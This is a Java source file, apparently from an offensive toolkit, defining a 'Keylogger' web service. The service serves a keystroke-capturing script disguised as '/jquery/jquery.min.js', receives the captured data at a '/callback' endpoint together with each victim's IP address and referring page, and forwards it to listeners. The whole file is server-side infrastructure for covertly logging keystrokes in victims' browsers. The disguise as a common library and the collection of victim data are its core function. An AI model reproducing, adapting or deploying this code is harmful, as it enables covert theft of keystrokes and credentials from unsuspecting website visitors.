package cloudstrike;

import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import profiler.SystemProfiler;

public class Keylogger implements WebService {
   protected String content;
   protected String type;
   protected String desc;
   protected String proto = "";
   protected List listeners = new LinkedList();

   public void addKeyloggerListener(KeyloggerListener l) {
      this.listeners.add(l);
   }

   public Keylogger(String content, String type, String desc) {
      this.content = content;
      this.type = type;
      this.desc = desc;
   }

   public void setup(WebServer w, String uri) {
      w.register(uri, this);
      w.registerSecondary("/callback", this);
      w.registerSecondary("/jquery/jquery.min.js", this);
      if (w.isSSL()) {
         this.proto = "https://";
      } else {
         this.proto = "http://";
      }

   }

   public boolean suppressEvent(String uri) {
      return "/callback".equals(uri);
   }

   public String resource(String resource, String url) {
      StringBuffer temp = new StringBuffer(524288);

      try {
         SystemProfiler.suckItDown(resource, temp);
      } catch (Exception var5) {
         WebServer.logException("Could not get resource: " + resource, var5, false);
      }

      return temp.toString().replace("%URL%", url);
   }

   public Response serve(String uri, String method, Properties header, Properties param) {
      if (uri.equals("/jquery/jquery.min.js")) {
         return new Response("200 OK", "text/javascript", this.resource("/resources/keylogger.js", this.proto + header.get("Host") + "/callback"));
      } else if (!uri.equals("/callback")) {
         return new Response("200 OK", this.type, this.content.replace("%TOKEN%", param.get("id") + ""));
      } else {
         Iterator i = this.listeners.iterator();
         String who = header.get("REMOTE_ADDRESS") + "";
         String from = header.get("Referer") + "";
         if (who.length() > 1) {
            who = who.substring(1);
         }

         KeyloggerListener l = null;

         while(i.hasNext()) {
            try {
               l = (KeyloggerListener)i.next();
               l.slowlyStrokeMe(from, who, param, param.get("id") + "");
            } catch (Exception var10) {
               WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, var10, false);
            }
         }

         return new Response("200 OK", "text/plain", "");
      }
   }

   public String toString() {
      return this.desc;
   }

   public String getType() {
      return "page";
   }

   public List cleanupJobs() {
      return new LinkedList();
   }

   public boolean isFuzzy() {
      return false;
   }

   public interface KeyloggerListener {
      void slowlyStrokeMe(String var1, String var2, Map var3, String var4);
   }
}
